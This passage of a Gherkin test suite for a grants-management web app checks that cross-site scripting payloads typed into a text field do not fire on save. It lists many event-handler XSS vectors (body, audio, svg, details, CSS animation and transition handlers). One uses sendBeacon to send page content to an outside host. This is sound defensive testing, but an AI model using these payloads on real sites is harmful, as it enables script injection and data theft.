      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301867 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                      | Field                  |
      | <body onpageshow=alert(1)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301874 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                  | Field                  |
      | <audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301878 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                     | Field                  |
      | <audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301879 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                     | Field                  |
      | <body onpopstate=print()> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301907 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                   | Field                  |
      | <audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301916 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                   | Field                  |
      | <svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 /> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301918 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                     | Field                  |
      | <body onresize="print()"> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301921 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                   | Field                  |
      | <body onscroll=alert(1)><div style=height:1000px></div><div id=x></div> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301923 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                   | Field                  |
      | <marquee onstart=alert(1)>XSS</marquee> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301925 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                 | Field                  |
      | <audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301929 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                          | Field                  |
      | <details ontoggle=alert(1) open>test</details> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301931 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                        | Field                  |
      | <style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301933 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                              | Field                  |
      | <xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301935 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                       | Field                  |
      | <style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=print()></xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301938 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                      | Field                  |
      | <style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301945 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                               | Field                  |
      | <body onunhandledrejection=alert(1)><script>fetch('//xyz')</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301953 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                               | Field                  |
      | <body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301991 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                             | Field                  |
      | <style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301993 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                                 | Field                  |
      | <style>keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301994 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                              | Field                  |
      | <style>keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301995 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
